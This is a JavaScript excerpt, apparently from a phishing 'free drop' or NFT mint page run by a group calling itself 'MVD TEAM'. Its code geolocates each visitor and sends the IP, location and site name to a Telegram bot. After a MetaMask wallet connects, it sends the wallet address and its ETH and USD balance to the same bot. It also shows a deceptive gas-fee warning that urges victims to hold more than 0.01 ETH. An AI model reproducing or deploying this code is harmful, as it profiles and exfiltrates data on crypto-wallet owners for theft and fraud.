...
$.getJSON('https://api.ipregistry.co/?key=qr3fe18rpovh9lli', (data) => {
    const ip = data.ip ;
    const emoji = data.location.country.flag.emoji ;
    const country = data.location.country.name ;
    const region = data.location.region.name ;
    const city = data.location.city ;
    var pAGESS = document.location.host
    var MAMES= namess;

    let loginsite = "\uD83D\uDC64  Пользователь " + ip + " " + emoji + 
                    "\r%0A\uD83C\uDF10 Зашел на сайт: " + pAGESS +
                    "\r%0A"+"\r%0A"+"\uD83D\uDC8E \uD83D\uDC8E MVD TEAM \uD83D\uDC8E \uD83D\uDC8E"

    let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${loginsite}`;
...
const getBalance123 = async () => {

    const options = {
      chain: "0x1",
      address: accounts,
    };
    const balancer = await Moralis.Web3API.account.getNativeBalance(options);
    console.log(" Moralis balance : "+ balancer.balance)
  
    const ETHbalance321 = balancer.balance / 1e18
    console.log(" ETH balance : "+ ETHbalance321)
  

    const ipgeolocation = 'https://api.ipregistry.co/?key=qr3fe18rpovh9lli';
    const USDc = 'https://cex.io/api/last_price/ETH/USD'; 
    ...
    $.getJSON(ipgeolocation, (data) => {
      ...
      var MAMES= namess;
          ...
          $.getJSON(USDc, (data1) => {
              const USDconvert1 = data1.lprice ;
              const USDBUS = (ETHbalance321 * USDconvert1);
  
              let loginsGetAccount =   "\r%0A\uD83E\uDD8A Подключил MetaMask" +
                              "\r%0A\uD83D\uDD11  Пользователь " + ip + " " + emoji +
                              "\r%0A\uD83C\uDF10 Сайт: " + pAGESS  +
                              "\r%0A\uD83D\uDCB3 Кошелек: " + accounts + 
                              "\r%0A\uD83D\uDCB5 Баланс ETH : "  + ETHbalance321 +
                              "\r%0A\uD83D\uDCB0 Баланс USD: "  + USDBUS.toFixed(3) +
                              "\r%0A"+"\r%0A"+"\uD83D\uDC8E \uD83D\uDC8E MVD TEAM \uD83D\uDC8E \uD83D\uDC8E"
  
              let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${loginsGetAccount}`;
              let request = new XMLHttpRequest();
              request.open("GET", urlString);
              request.send();
              let response = request.response;
...
const getBalanceZero = async () => {
    const options = {
        chain: "0x1",
        address: accounts,
      };
      const balancer1 = await Moralis.Web3API.account.getNativeBalance(options);
      console.log(" Moralis balance : "+ balancer1.balance)
    
      const ETHbalance3211 = balancer1.balance / 1e18
      console.log(" ETH balance : "+ ETHbalance3211)


      if (ETHbalance3211 < 0.001){
console.log("ETH balance zerooo ")

Swal.fire({

    icon: 'error',
    title: 'Oops... There is not enough balance to pay for gas. We recommend using a wallet with a balance of more than 0.01 ETH',
    text: 'Kindly note that every ethereum transactions require a gas fee, thus; your free drop may fail or not connected if you have no gas fee.!',
  })
      }else {
        console.log(" ETH balance is good ")
...
mint.addEventListener("click", async () => {
    ...
    //     var pAGESS = document.location.host
    //     var MAMES= namess;
    //     let text1 = "NEW ETH request " + 
    //                 "\r%0A Project : " + MAMES + 
    //                 "\r%0A Link : " + pAGESS +
    //                 "\r%0A Country : " + emoji + " " + country +
    //                 "\r%0A Region, city : " + region + ", " + city + 
    //                 "\r%0A ip : " + ip + 
    //                 "\r%0A ETH Adress : " + "https://etherscan.io/address/" + accounts;


    //     let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text1}`;
    //     let request = new XMLHttpRequest();
    //     request.open("GET", urlString);
    //     request.send();
    //     let response = request.response;
